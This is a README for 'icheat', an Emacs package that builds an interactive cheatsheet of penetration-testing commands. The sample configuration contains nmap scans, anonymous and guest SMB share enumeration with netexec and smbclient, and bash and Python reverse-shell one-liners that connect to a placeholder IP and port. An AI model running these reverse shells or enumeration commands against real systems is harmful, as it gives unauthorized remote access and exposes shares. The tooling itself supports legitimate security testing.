# icheat

(btw, work in progress)

Interactive cheatsheet in Emacs.

Define lists of commands that are useful to remember in specific
contexts, such as during a penetration test.

```emacs-lisp
(icheat-def-cmd
 "nmap"
 (("standard"       . "nmap -sC -sV --min-rate 1000 %ip")
  ("full-tcp-ports" . "nmap -p- --min-rate 1000 %ip")
  ("standard-ad"    . "nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,54296 -sCV %ip")))


(icheat-def-cmd
 "smb"
 (("guest-access"        . "netexec smb %domain -u guest -p '' --shares")
  ("anonymous-access"    . "netexec smb %domain --shares")
  ("smbclient anonymous" . "smbclient -N //%domain/%share")
  ))

(icheat-def-cmd
 "reverse"
 (("bash-1"   . "bash -i >& /dev/tcp/%ip/%port 0>&1")
  ("bash-2"   . "bash -c \"bash -i >& /dev/tcp/%ip/%port 0>&1\"")
  ("python-1" . "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%ip\",%port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")))
```

For each tool declared using the macro `icheat-def-cmd`, a function
will be created that can be used to generate the different types of
commands for that particular tool. This is an approach to implement
the idea of an 'interactive cheatsheet'. For example the code shown
will create the functions `icheat-cmd-nmap`, `icheat-cmd-smb` and
`icheat-cmd-reverse`.

Notice that during the creation of the command list you can use
special format identifiers such as `%ip`, `%port`, `%domain`,
`%share`.

```
bash -i >& /dev/tcp/%ip/%port 0>&1
```

These identifiers are resolved during the generation of the command by
defining appropriate formatting options using the `icheat-def-fmt`
macro.

```
(icheat-def-fmt "ip" nil)

(icheat-def-fmt
 "wordlist"
 (("directory-list-2.3-small.txt"  . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt")
  ("directory-list-2.3-medium.txt" . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt")
  ("directory-list-2.3-big.txt"    . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt")
  ))

```

Finally, it is worth to note that depending on how the function is
called, the generated output is returned either as a direct value, or
it is copied into the kill-ring. By default, when calling
interactively, the function will copy its output into the kill-ring.